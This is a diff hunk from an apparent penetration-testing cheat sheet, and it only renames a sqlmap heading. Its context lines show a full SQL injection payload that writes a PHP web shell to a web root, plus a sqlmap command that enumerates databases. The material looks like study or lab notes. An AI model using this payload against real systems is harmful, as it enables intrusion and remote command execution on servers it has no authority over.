@@ -321,8 +321,7 @@ ippsec example (Writing files to disk)
 X' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'-- -
 ```
 
-### quick sqlmap examples
-
+### quick sqlmap examples using a request file
 
 listing databases  
 `sqlmap -r file.req --dbs`
